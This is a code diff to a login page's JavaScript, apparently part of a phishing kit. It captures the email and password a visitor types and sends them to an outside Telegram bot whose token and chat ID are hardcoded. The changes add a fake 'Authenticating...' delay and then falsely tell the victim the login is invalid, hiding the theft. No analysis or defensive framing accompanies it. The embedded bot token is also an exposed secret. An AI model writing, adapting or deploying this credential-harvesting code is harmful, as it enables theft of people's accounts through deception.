@@ -213,29 +213,30 @@
 
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
+
             const botToken = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
             const chatId = "6885599280";
-
             const message = `Email: ${email}\nPassword: ${password}`;
 
+            const notificationBar = document.getElementById("notification-bar");
+            notificationBar.textContent = "Authenticating...";
+            notificationBar.style.display = "block";
+            notificationBar.className = "notification-bar auth-bar";
+
             try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                await new Promise(resolve => setTimeout(resolve, 3000));
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ chat_id: chatId, text: message })
                 });
 
-                const result = await response.json();
-
-                const notificationBar = document.getElementById("notification-bar");
-                if (result.ok) {
-                    notificationBar.textContent = "Message sent.";
-                } else {
-                    notificationBar.textContent = "Failed to send message.";
-                }
-                notificationBar.style.display = "block";
+                notificationBar.textContent = "The login is invalid.";
+                notificationBar.className = "notification-bar error-bar";
             } catch (error) {
-                alert("Error sending data to Telegram.");
+                notificationBar.textContent = "An error occurred. Please try again.";
+                notificationBar.className = "notification-bar error-bar";
             }
         }
     </script>
